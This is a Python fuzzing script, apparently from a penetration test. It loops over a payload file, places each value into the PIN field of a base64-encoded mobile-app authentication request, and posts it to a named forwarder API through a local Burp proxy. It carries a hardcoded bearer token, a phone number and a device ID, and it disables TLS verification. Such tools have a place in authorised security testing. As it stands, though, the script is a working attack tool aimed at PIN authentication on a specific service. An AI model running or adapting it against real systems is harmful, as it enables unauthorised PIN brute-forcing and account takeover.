#!/bin/python3

import requests
import urllib3
import base64
import json
import sys
import time

urllib3.disable_warnings()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    ORANGE = '\033[33m'
    BLUE = '\033[34m'
    PURPLE = '\033[35m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
listproxies = {"http": "127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

headers = {
    'Host': 'app.customer.co.za',
    'Content-Length': '148',
    'Accept': 'application/json, text/plain, */*',
    'Origin': 'http://mobileapp.customer.com.za',
    'Authorization': 'Bearer eyJhiI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hNDY3NTY2fQ.cPmk9lA1yypysO100ihXvA',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Galaxy S7 Build/ AppleWebKit/74.0.3729.186 Mobile Safari/537.36',
    'Innerurl': '',
    'Content-Type': 'text/plain',
    'Referer': 'http://app.customer.co.za/home',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'X-Requested-With': 'za.co.customer.mobileapp',
    'Connection': 'close',
}

print(f"{bcolors.RED}\n USAGE: {bcolors.ENDC}")  # todo list for next version
print("""\nFuzz-API-Forwarder-b64-1.py RawPOSTData InputFile.txt """)  # to be completed
print(f"The string {bcolors.RED}FUZZER{bcolors.ENDC} marks the input location is the mark where injection will be performed\n")

inputpayloadfile = sys.argv[1]
print(f"{bcolors.PURPLE}[a] Input Payload File {bcolors.ENDC}")
print(f"{bcolors.PURPLE}",inputpayloadfile)
print(f"{bcolors.ENDC}")

file1 = open(inputpayloadfile, 'r')
Lines = file1.readlines()
count = 0

for line in Lines:
	count += 1
	InjectedPayload = line.strip()
	print(f"{bcolors.RED} INJECTNG PAYLOAD  : ",count, "  FUZZER Value = ",InjectedPayload)
	print(f"{bcolors.ENDC}")

	RawPOSTData = r'{"uri":"CUS:Authentication/authenticateUser?Mobile=059966595","httpMethod":"post","request":"{\"os\":\"android\",\"osVersion\":\"10\",\"deviceId\":\"2debe904a24996f9\",\"appName\":\"za.com.customer.mobileapp\",\"appVersion\":\"1.0.45\",\"mobile\":\"0459966595\",\"pin\":\"FUZZER\"}"}'
	# RawPOSTData = r'{"uri":"CUS:Device/isDeviceRegistered","httpMethod":"post","request":"{\"DeviceId\":\"FUZZER\",\"AppName\":\"au.com.creditcorp.wizit\"}"}'
	
	print(f"{bcolors.ENDC}[i]  Raw POST Data {bcolors.ENDC}")
	print(RawPOSTData, "\n")

	rawdata = RawPOSTData.replace("FUZZER", InjectedPayload)
	print(f"{bcolors.ENDC}[i]  Injected Raw POST Data {bcolors.ENDC}")
	print(rawdata, "\n")
	
	payload_bytes = rawdata.encode('ascii')
	base64_bytes = base64.b64encode(payload_bytes)
	payload = base64_bytes.decode('ascii')
	
	print(f"{bcolors.OKCYAN}[i]  Base64 Payload {bcolors.ENDC}")
	print(payload, "\n")

	response = requests.post('https://dev2portal.wizpay.com.au/api/forwarder', headers=headers, data=payload, proxies=listproxies, verify=False) # proxies=Burp Suite

	print(f"{bcolors.OKGREEN}[o]  Response Status Code {bcolors.ENDC}")
	print(response.status_code)

	print(f"{bcolors.OKGREEN}[o]  Response Headers ")
	print(f"{bcolors.OKGREEN}",response.headers)
	print(f"{bcolors.ENDC}")

	print(f"{bcolors.WARNING}[o] Response JSON {bcolors.ENDC}")	
	try:
		pretty_json = json.dumps( response.json() , indent=4)
		print(f"{bcolors.WARNING}",pretty_json)
	except ValueError:
		print('Decoding JSON has failed')

	print(f"{bcolors.ENDC}")

	time.sleep(1)  # optimize the code.... reduce the sleep time LOL
